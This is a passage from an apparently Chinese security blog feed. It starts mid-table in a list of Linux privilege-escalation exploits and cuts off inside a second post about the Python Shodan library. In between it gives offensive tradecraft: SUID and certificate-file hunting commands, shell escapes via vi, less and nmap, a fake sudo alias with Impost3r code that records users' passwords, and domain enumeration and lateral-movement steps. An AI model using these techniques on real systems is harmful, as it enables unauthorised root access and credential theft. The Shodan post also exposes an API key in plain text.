Buggyvmacache_flush_all()Fastpath Local PrivilegeEscalation</td><td>Google Security Research</td></tr><tr><td>2018/08/03</td><td>Linux Kernel - UDPFragmentation Offset ‘UFO’Privilege Escalation(Metasploit)</td><td>Metasploit</td></tr><tr><td>2018/07/19</td><td>Linux - BPF Sign ExtensionLocal Privilege Escalation(Metasploit)</td><td>Metasploit</td></tr><tr><td>2018/07/10</td><td>Linux Kernel &lt; 4.13.9(Ubuntu 16.04 / Fedora 27) -Local Privilege Escalation</td><td>rlarabee</td></tr></tbody></table><table><thead><tr><th>2018/05/22</th><th>Linux 4.4.0 &lt; 4.4.0-53 -‘AF_PACKET chocobo_root’Local Privilege Escalation(Metasploit)</th><th>Metasploit</th></tr></thead><tbody><tr><td>2018/05/21</td><td>Linux 2.6.30 &lt; 2.6.36-rc8 -Reliable Datagram Sockets(RDS) Privilege Escalation(Metasploit)</td><td>Metasploit</td></tr><tr><td>2018/05/18</td><td>Linux 4.8.0 &lt; 4.8.0-46 -AF_PACKET packet_set_ringPrivilege Escalation(Metasploit)</td><td>Metasploit</td></tr><tr><td>2017/08/13</td><td>Linux Kernel &lt; 4.4.0-83 / &lt;4.8.0-58 (Ubuntu14.04/16.04) - LocalPrivilege Escalation (KASLR/ SMEP)</td><td>Andrey Konovalov</td></tr><tr><td>2017/09/06</td><td>Tor (Linux) - X11 LinuxSandbox Breakout</td><td>Google Security Research</td></tr><tr><td>2017/05/22</td><td>VMware Workstation forLinux 12.5.2 build-4638234- ALSA Configuration HostLocal Privilege Escalation</td><td></td></tr><tr><td>2017/05/11</td><td>Linux Kernel 4.8.0-41-generic (Ubuntu) - PacketSocket Local PrivilegeEscalation</td><td>Andrey Konovalov</td></tr><tr><td>2016/11/27</td><td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW /proc/self/mem’Race Condition PrivilegeEscalation (/etc/passwdMethod)</td><td>Gabriele Bonacini</td></tr><tr><td>2016/11/28</td><td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’’PTRACE_POKEDATA’ RaceCondition PrivilegeEscalation (/etc/passwdMethod)</td><td>FireFart</td></tr><tr><td>2016/11/14</td><td>Linux Kernel 4.4 (Ubuntu16.04) - ‘BPF’ Local PrivilegeEscalation (Metasploit)</td><td>Metasploit</td></tr></tbody></table><table><thead><tr><th>2016/11/02</th><th>Linux Kernel (Ubuntu /Fedora / RedHat) -‘Overlayfs’ Local PrivilegeEscalation (Metasploit)</th><th>Metasploit</th></tr></thead><tbody><tr><td>2016/10/21</td><td>Linux Kernel 2.6.22 &lt; 3.9(x86/x64) - ‘Dirty COW/proc/self/mem’ RaceCondition PrivilegeEscalation (SUID Method)</td><td>Robin Verton</td></tr><tr><td>2016/10/19</td><td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’ /proc/self/memRace Condition (WriteAccess Method)</td><td>Phil Oester</td></tr><tr><td>2016/10/11</td><td>Linux Kernel 3.13.1 -‘Recvmmsg’ Local PrivilegeEscalation (Metasploit)</td><td>Metasploit</td></tr><tr><td>2016/06/21</td><td>Linux Kernel - ‘ecryptfs’’/proc/$pid/environ’ LocalPrivilege Escalation</td><td>Google Security Research</td></tr><tr><td>2016/05/04</td><td>Linux Kernel 4.4.x (Ubuntu16.04) - ‘double-fdput()’bpf(BPF_PROG_LOAD)Privilege Escalation</td><td>Google Security Research</td></tr><tr><td>2016/05/04</td><td>Linux Kernel (Ubuntu14.04.3) -‘perf_event_open()’ Can Racewith execve() (Access/etc/shadow)</td><td>Google Security Research</td></tr><tr><td>2014/05/28</td><td>Linux Kernel 3.3.5 -‘/drivers/media/media-device.c’ Local InformationDisclosure</td><td>Salva Peiro</td></tr><tr><td>2016/01/05</td><td>Linux Kernel 4.3.3 (Ubuntu14.04/15.10) - ‘overlayfs’Local Privilege Escalation (1)</td><td>rebel</td></tr><tr><td>2013/06/07</td><td>Linux Kernel 3.3.5 - ‘b43’Wireless Driver PrivilegeEscalation</td><td>Kees Cook</td></tr></tbody></table><table><thead><tr><th>2015/10/15</th><th>Linux Kernel 3.17 - ‘Pythonctypes and memfd_create’noexec File Security Bypass</th><th>soyer</th></tr></thead><tbody><tr><td>2013/03/13</td><td>Linux Kernel 3.0 &lt; 3.3.5 -‘CLONE_NEWUSER|CLONE_FS’ Local Privilege Escalation</td><td>Sebastian Krahmer</td></tr><tr><td>2012/10/09</td><td>Linux Kernel 3.2.x -‘uname()’ System Call LocalInformation Disclosure</td><td>Brad Spengler</td></tr><tr><td>2012/07/26</td><td>Linux Kernel 2.6.x -‘rds_recvmsg()’ LocalInformation Disclosure</td><td>Jay Fenlason</td></tr><tr><td>2015/06/16</td><td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation (Access/etc/shadow)</td><td></td></tr><tr><td>2015/06/16</td><td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation</td><td>rebel</td></tr><tr><td>2011/11/07</td><td>Linux Kernel 3.0.4 -‘/proc/interrupts’ PasswordLength Local InformationDisclosure</td><td>Vasiliy Kulikov</td></tr><tr><td>2012/01/12</td><td>Linux Kernel 2.6.39 &lt; 3.2.2(x86/x64) - ‘Mempodipper’Local Privilege Escalation (2)</td><td>zx2c4</td></tr><tr><td>2014/10/20</td><td>Linux PolicyKit - RaceCondition PrivilegeEscalation (Metasploit)</td><td>Metasploit</td></tr><tr><td>2010/11/09</td><td>Linux Kernel 2.6.x -‘net/core/filter.c’ LocalInformation Disclosure</td><td>Dan Rosenberg</td></tr></tbody></table><table><thead><tr><th>2010/05/18</th><th>Linux Kernel 2.6.x - BtrfsCloned File Security Bypass</th><th>Dan Rosenberg</th></tr></thead><tbody><tr><td>2014/06/21</td><td>Linux Kernel 3.13 - SGIDPrivilege Escalation</td><td>Vitaly Nikolenko</td></tr><tr><td>2009/12/16</td><td>Linux Kernel &lt; 2.6.28 -‘fasync_helper()’ LocalPrivilege Escalation</td><td>Tavis Ormandy</td></tr><tr><td>2009/11/09</td><td>Linux Kernel 2.6.x - Ext4’move extents’ ioctl PrivilegeEscalation</td><td>Akira Fujita</td></tr><tr><td>2013/02/24</td><td>Linux Kernel 3.3 &lt; 3.8(Ubuntu / Fedora 18) -‘sock_diag_handlers()’ LocalPrivilege Escalation (3)</td><td>SynQ</td></tr><tr><td>2009/11/03</td><td>Linux Kernel 2.6.x - ‘pipe.c’Local Privilege Escalation (2)</td><td>teach &amp; xipe</td></tr><tr><td>2009/11/03</td><td>Linux Kernel 2.6.0 &lt; 2.6.31 -‘pipe.c’ Local PrivilegeEscalation (1)</td><td>teach &amp; xipe</td></tr><tr><td>2009/03/02</td><td>Linux Kernel 2.6.x -‘seccomp’ System CallSecurity Bypass</td><td>Chris Evans</td></tr><tr><td>2009/02/20</td><td>Linux Kernel 2.6.x - ‘sock.c’SO_BSDCOMPAT OptionInformation Disclosure</td><td>Clément Lecigne</td></tr><tr><td>2014/02/02</td><td>Linux Kernel 3.4 &lt; 3.13.2(Ubuntu 13.10) -‘CONFIG_X86_X32’ ArbitraryWrite (2)</td><td>saelo</td></tr></tbody></table><table><thead><tr><th>2007/9/21</th><th>Linux Kernel 2.6.x - ALSAsnd-page-alloc Local ProcFile Information Disclosure</th><th>Karimo_DM</th></tr></thead><tbody><tr><td>2007/9/21</td><td>Linux Kernel 2.6.x - PtracePrivilege Escalation</td><td>Wojciech Purczynski</td></tr><tr><td>2007/03/05</td><td>Linux Kernel 2.6.17 -‘Sys_Tee’ Local PrivilegeEscalation</td><td>Michael Kerrisk</td></tr><tr><td>2006/07/27</td><td>Linux-HA Heartbeat1.2.3/2.0.x - InsecureDefault Permissions onShared Memory</td><td>anonymous</td></tr><tr><td>2006/04/28</td><td>Linux Kernel 2.6.x - CIFSCHRoot Security RestrictionBypass</td><td>Marcel Holtmann</td></tr><tr><td>2006/04/28</td><td>Linux Kernel 2.6.x - SMBFSCHRoot Security RestrictionBypass</td><td>Marcel Holtmann</td></tr><tr><td>2006/03/23</td><td>Linux Kernel2.4.x/2.5.x/2.6.x -‘Sockaddr_In.Sin_Zero’Kernel Memory Disclosure</td><td>Pavel Kankovsky</td></tr><tr><td>2005/10/17</td><td>Linux Kernel 2.6 - ConsoleKeymap Local CommandInjection</td><td>Rudolf Polzer</td></tr><tr><td>2005/05/26</td><td>Linux Kernel 2.6.x -Cryptoloop InformationDisclosure</td><td>Markku-JuhaniO. Saarinen</td></tr><tr><td>2005/10/19</td><td>Linux Kernel 2.4.30/2.6.11.5- BlueTooth’bluez_sock_create’ LocalPrivilege Escalation</td><td>backdoored.net</td></tr></tbody></table><table><thead><tr><th>2005/04/08</th><th>Linux Kernel 2.4.x/2.6.x -BlueTooth Signed BufferIndex Privilege Escalation (1)</th><th>qobaiashi</th></tr></thead><tbody><tr><td>2005/03/09</td><td>Linux Kernel 2.6.x -‘SYS_EPoll_Wait’ LocalInteger Overflow / LocalPrivilege Escalation (1)</td><td>sd</td></tr><tr><td>2004/04/23</td><td>Linux Kernel 2.5.x/2.6.x -CPUFreq Proc HandlerInteger Handling MemoryRead</td><td>Brad Spengler</td></tr><tr><td>2004/02/09</td><td>Samba 2.2.8 (Linux Kernel2.6 / Debian / Mandrake) -Share Privilege Escalation</td><td>Martin Fiala</td></tr><tr><td>2004/02/06</td><td>Linux VServer Project 1.2x -Chroot Breakout</td><td>Markus Mueller</td></tr><tr><td>2003/10/06</td><td>SuSE Linux Professional 8.2- SuSEWM ConfigurationFile Insecure Temporary File</td><td>Nash Leon</td></tr><tr><td>2003/09/09</td><td>RealOne Player for Linux 2.2Alpha - InsecureConfiguration FilePermission PrivilegeEscalation</td><td>Jon Hart</td></tr><tr><td>2012/12/02</td><td>MySQL (Linux) - DatabasePrivilege Escalation</td><td>kingcope</td></tr><tr><td>2003/06/26</td><td>Linux Kernel 2.4 - SUID’execve()’ System Call RaceCondition Executable FileRead</td><td>IhaQueR</td></tr><tr><td>2003/06/20</td><td>Linux Kernel 2.2.x/2.4.x -‘/proc’ FilesystemInformation Disclosure</td><td>IhaQueR</td></tr></tbody></table><table><thead><tr><th>2003/06/16</th><th>Linux PAM 0.77 -Pam_Wheel Module’getlogin() Username’Spoofing Privilege Escalation</th><th>Karol Wiesek</th></tr></thead><tbody><tr><td>2003/02/18</td><td>Linux-ATM LES 2.4 -Command Line ArgumentBuffer Overflow</td><td>Angelo Rosiello</td></tr><tr><td>2003/04/04</td><td>Linux Kernel 2.2.x/2.4.x -I/O System Call FileExistence</td><td>Andrew Griffiths</td></tr><tr><td>2003/04/10</td><td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (2)</td><td>Wojciech Purczynski</td></tr><tr><td>2003/03/17</td><td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (1)</td><td><a href="mailto:anszom@v-lo.krakow.pl" target="_blank" rel="noopener">anszom@v-lo.krakow.pl</a></td></tr><tr><td>2012/10/10</td><td>Linux Kernel UDEV &lt; 1.4.1 -‘Netlink’ Local PrivilegeEscalation (Metasploit)</td><td>Metasploit</td></tr><tr><td>2002/08/28</td><td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (3)</td><td>syscalls</td></tr><tr><td>2002/08/28</td><td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (2)</td><td>David Endler</td></tr><tr><td>2002/08/28</td><td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (1)</td><td>RaiSe</td></tr><tr><td>2002/08/10</td><td>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (2)</td><td>TESO Security</td></tr></tbody></table><table><thead><tr><th>2002/08/10</th><th>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (1)</th><th>Gobbles Security</th></tr></thead><tbody><tr><td>2002/05/17</td><td>Grsecurity Kernel Patch 1.9.4(Linux Kernel) - MemoryProtection</td><td>Guillaume PELAT</td></tr><tr><td>2002/03/26</td><td>Linux Kernel 2.2.x/2.3/2.4.x- ‘d_path()’ Path Truncation</td><td>cliph</td></tr><tr><td>2002/02/25</td><td>Century Software Term ForLinux 6.27.869 - CommandLine Buffer Overflow</td><td>Haiku Hacker</td></tr><tr><td>2000/08/25</td><td>User-Mode Linux (LinuxKernel 2.4.17-8) - MemoryAccess Privilege Escalation</td><td>Andrew Griffiths</td></tr><tr><td>2001/11/21</td><td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Local Buffer Overflow</td><td>IhaQueR@IRCnet</td></tr><tr><td>2001/11/21</td><td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Shell Definition FormatString</td><td>IhaQueR@IRCnet</td></tr><tr><td>2001/10/18</td><td>Linux Kernel 2.2/2.4 -Ptrace/Setuid Exec PrivilegeEscalation</td><td>Rafal Wojtczuk</td></tr><tr><td>2001/06/27</td><td>Linux Kernel 2.2/2.4 -procfs Stream redirection toProcess Memory PrivilegeEscalation</td><td></td></tr><tr><td>2001/06/12</td><td>Linux Man Page6.1/6.2/7.0/7.1- SourceBuffer Overflow</td><td>zen-parse</td></tr></tbody></table><table><thead><tr><th>2001/05/13</th><th>Immunix OS 6.2/7.0 /RedHat 5.2/6.2/7.0 / SuSELinux 6.x/7.0/7.1 - ‘Man -S’Heap Overflow</th><th>zenith parsec</th></tr></thead><tbody><tr><td>2001/03/27</td><td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (2)</td><td>Wojciech Purczynski</td></tr><tr><td>2001/03/27</td><td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (1)</td><td>Wojciech Purczynski</td></tr><tr><td>2001/02/09</td><td>Linux Kernel 2.2.x - ‘sysctl()’Memory Reading</td><td>Chris Evans</td></tr><tr><td>2000/11/30</td><td>Linux Kernel 2.2.x - Non-Readable File Ptrace LocalInformation Leak</td><td>Lamagra Argamal</td></tr><tr><td>2000/11/12</td><td>Linux modutils 2.3.9 -‘modprobe’ ArbitraryCommand Execution</td><td>Michal Zalewski</td></tr><tr><td>2000/06/07</td><td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail 8.10.1 CapabilitiesPrivilege Escalation (2)</td><td>Wojciech Purczynski</td></tr><tr><td>2000/06/07</td><td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail CapabilitiesPrivilege Escalation(1)</td><td>Florian Heinz</td></tr><tr><td>2000/05/29</td><td>Mandriva Linux Mandrake 7.0- Local Buffer Overflow</td><td>noir</td></tr><tr><td>2000/05/22</td><td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (3)</td><td>WaR</td></tr></tbody></table><table><thead><tr><th>2000/05/22</th><th>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (2)</th><th>Scrippie</th></tr></thead><tbody><tr><td>2000/05/22</td><td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (1)</td><td>Paulo Ribeiro</td></tr><tr><td>2012/07/19</td><td>Linux Kernel 2.4.4 &lt; 2.4.37.4/ 2.6.0 &lt; 2.6.30.4 -‘Sendpage’ Local PrivilegeEscalation (Metasploit)</td><td>Metasploit</td></tr><tr><td>2000/05/03</td><td>RedHat Linux 6.0/6.1/6.2 -‘pam_console’ MonitorActivity After Logout</td><td>Michal Zalewski</td></tr><tr><td>2000/04/29</td><td>SuSE Linux 6.3/6.4 Gnomelib- Local Buffer Overflow</td><td>bladi</td></tr><tr><td>2000/04/21</td><td>SuSE Linux 6.x - ArbitraryFile Deletion</td><td>Peter_M</td></tr><tr><td>2000/04/10</td><td>Bray Systems Linux Trustees1.5 - Long Pathname</td><td>Andrey E. Lerman</td></tr><tr><td>2000/03/16</td><td>Halloween Linux 4.0 / SuSELinux 6.0/6.1/6.2/6.3 -‘kreatecd’ Local PrivilegeEscalation</td><td>Sebastian</td></tr><tr><td>2000/03/13</td><td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (2)</td><td>S.Krahmer &amp; Stealth</td></tr><tr><td>2000/03/13</td><td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (1)</td><td>funkysh</td></tr></tbody></table><table><thead><tr><th>2000/03/11</th><th>AT Computing atsar_linux 1.4- File Manipulation</th><th>S. Krahmer</th></tr></thead><tbody><tr><td>2000/03/05</td><td>Oracle8i Standard Edition8.1.5 for Linux Installer -Local Privilege Escalation</td><td>Keyser Soze</td></tr><tr><td>2000/03/02</td><td>Corel Linux OS 1.0 - DosemuDistribution Configuration</td><td>suid</td></tr><tr><td>2000/02/26</td><td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (2)</td><td>Babcia Padlina</td></tr><tr><td>2000/02/26</td><td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (1)</td><td>Babcia Padlina</td></tr><tr><td>2000/02/24</td><td>Corel Linux OS 1.0 -‘setxconf’ Local PrivilegeEscalation</td><td>suid</td></tr><tr><td>2000/02/24</td><td>Corel Linux OS 1.0 -buildxconfig</td><td>suid</td></tr><tr><td>2000/02/23</td><td>RedHat Linux 6.0 - SingleUser Mode Authentication</td><td>Darren Reed</td></tr><tr><td>2000/01/12</td><td>Corel Linux OS 1.0 - get_itPATH</td><td>Cesar Tascon Alvarez</td></tr><tr><td>2000/03/15</td><td>Mandrake 6.x / RedHat 6.x /Turbolinux 3.5 b2/4.x/6.0.2userhelper/PAM - Path (2)</td><td>Elias Levy</td></tr></tbody></table><p>⽐较常⽤的漏洞：</p><p>CVE-2016-5195: 脏⽜漏洞</p><p>CVE-2019-14287: sudo溢出漏洞</p><p>可以通过⾃动化脚本来匹配相关的内核漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebootuser/LinEnum </span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure><h3 id="0x03-suid提权"><a href="#0x03-suid提权" class="headerlink" title="0x03 suid提权"></a><strong>0x03 suid提权</strong></h3><p>suid允许⽤户在执⾏⽤户的许可下执⾏⽂件，创建和打开⽹络套接字⼀般需要root权限，但是为了⽅便使 ⽤，如Ping命令，通过设置Ping程序的suid，就可以允许低权限⽤户执⾏Ping程序时是以root权限执⾏。因此，如果⼀个程序中设置了suid，我们可以该程序⽣成的shell来提升权限。</p><p><strong>查找suid和guid⽂件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><strong>其它可⽤的命令</strong></p><p><strong>查找密钥或者证书:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f &apos;(&apos; -name .cert -or -name .crt -or -name .pem -or name .ca -or -name .p12 -or -name .cer -name *.der &apos;)&apos; &apos;(&apos; &apos;(&apos; -us er support -perm -u=r &apos;)&apos; -or &apos;(&apos; -group support -perm -g=r &apos;)&apos; -o r &apos;(&apos; -perm -o=r &apos;)&apos; &apos;)&apos; 2&gt; /dev/null-or -name .cer -name .der &apos;)&apos; 2&gt; /dev/nu</span><br></pre></td></tr></table></figure><p><strong>查找root拥有的suid⽂件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><strong>例⼦</strong></p><p><strong>vi / vim</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><strong>less</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><strong>nmap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -interactive</span><br><span class="line">! sh</span><br></pre></td></tr></table></figure><h3 id="0x04-伪造sudo"><a href="#0x04-伪造sudo" class="headerlink" title="0x04 伪造sudo"></a><strong>0x04 伪造sudo</strong></h3><p>Linux下命令执⾏顺序可以由⽤户决定，如改变.bashrc中的环境变量信息，也可以给某命令增加⼀个别名 等。可以伪造⼀个sudo命令，让⽤户每次输⼊的⼝令都存储下来，达到提权的⽬的。这⾥推荐Impost3r项⽬</p><p><strong>创建sudo别名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alias sudo=&apos;impost3r() &#123;</span><br><span class="line">if [ -f &quot;/tmp/.impost3r&quot; ]; then</span><br><span class="line">/tmp/.impost3r &quot;$@&quot; &amp;&amp; unalias sudo</span><br><span class="line">else</span><br><span class="line">unalias sudo;sudo &quot;$@&quot;</span><br><span class="line">fi</span><br><span class="line">&#125;; impost3r&apos;</span><br></pre></td></tr></table></figure><p><strong>impost3r核⼼代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int pid = fork();</span><br><span class="line">if (pid == 0)</span><br><span class="line">&#123;</span><br><span class="line">successFlag = 0;</span><br><span class="line">save_passwd(usrInfo-&gt;pw_name,originPasswd,allPasswd,1);</span><br><span class="line">return allPasswd;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">wait(NULL); // 防⽌⽤户执⾏的是⽆限循环服务，从⽽产⽣僵⼫进程</span><br><span class="line">execv(&quot;/usr/bin/sudo&quot;,params);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将⽤户输⼊的⼝令信息先通过 save_passwd 存储下来，然后再调⽤真实的sudo命令。</span><br></pre></td></tr></table></figure><h3 id="0x05-其它提权⼿法"><a href="#0x05-其它提权⼿法" class="headerlink" title="0x05 其它提权⼿法"></a><strong>0x05 其它提权⼿法</strong></h3><p>1.LXD提权</p><p>2.cronjob计划任务提权</p><p>3.NFS提权</p><p>4.⼝令爆破提权</p><h1 id="内网横向移动（拿域控）"><a href="#内网横向移动（拿域控）" class="headerlink" title="内网横向移动（拿域控）"></a>内网横向移动（拿域控）</h1><ol><li>使用当前权限添加内网路由，进行弱口令扫描</li><li>使用powershell对内网进行扫描（目标机器 &gt; win7）</li><li>架设Socket4a，然后Socket会自动进行内网扫描</li><li>利用当前权限进行内网IPC$渗透</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;net user /domain		&lt;span class=&quot;comment&quot;&gt;#查看域用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net view /domain		&lt;span class=&quot;comment&quot;&gt;#查看有几个域&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net view /domain:XXX	&lt;span class=&quot;comment&quot;&gt;#查看域内主机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net group /domain		&lt;span class=&quot;comment&quot;&gt;#查看域里面的组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net group &lt;span class=&quot;string&quot;&gt;&quot;domain computers&quot;&lt;/span&gt; /domain	&lt;span class=&quot;comment&quot;&gt;#查看域内所有主机名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net group &lt;span class=&quot;string&quot;&gt;&quot;domain admins&quot;&lt;/span&gt; /domain		&lt;span class=&quot;comment&quot;&gt;#查看域管理员&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net group &lt;span class=&quot;string&quot;&gt;&quot;domain controllers&quot;&lt;/span&gt; /domain	&lt;span class=&quot;comment&quot;&gt;#查看域控制器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net group &lt;span class=&quot;string&quot;&gt;&quot;enterprise admins&quot;&lt;/span&gt; /domain	&lt;span class=&quot;comment&quot;&gt;#查看企业管理组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nettime /domain			&lt;span class=&quot;comment&quot;&gt;#查看时间服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="内网" scheme="http://goudanjun.vip/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>python学习记录</title>
    <link href="http://goudanjun.vip/2021/02/07/python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/02/07/python学习记录.html/</id>
    <published>2021-02-07T11:46:24.000Z</published>
    <updated>2021-03-05T01:32:46.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python的shodan库"><a href="#python的shodan库" class="headerlink" title="python的shodan库"></a>python的shodan库</h1><a id="more"></a><p>库函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>shodan.Shodan(key)</td><td>初始化连接API</td></tr><tr><td>Shodan.count(query, facets=None)</td><td>返回查询结果数量</td></tr><tr><td>Shodan.host(ip, history=False)</td><td>返回一个IP的详细信息</td></tr><tr><td>Shodan.ports()</td><td>返回Shodan可查询的端口号</td></tr><tr><td>Shodan.protocols()</td><td>返回Shodan可查询的协议</td></tr><tr><td>Shodan.services()</td><td>返回Shodan可查询的服务</td></tr><tr><td>Shodan.queries(page=1, sort=’timestamp’, order=’desc’)</td><td>查询其他用户分享的查询规则</td></tr><tr><td>Shodan.scan(ips, force=False)</td><td>使用Shodan进行扫描，ips可以为字符或字典类型</td></tr><tr><td>Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)</td><td>查询Shodan数据</td></tr></tbody></table><p>在CMD中可以验证shodan是否能成功连接</p><p><img src="https://i.loli.net/2021/02/07/el5tEcjKdbSh716.png" alt="image-20210207200212322"></p><h2 id="扫描apache的主机"><a href="#扫描apache的主机" class="headerlink" title="扫描apache的主机"></a>扫描apache的主机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shodan    <span class="comment">#导入shodan库</span></span><br><span class="line">api=shodan.Shodan(<span class="string">"cB9sXwb7l95ZhSJaNgcaO7NQpkzfhQVM"</span>)  <span class="comment">#指定API_KEY,返回句柄</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    results=api.search(<span class="string">'apache'</span>)    <span class="comment">#搜索apache，返回 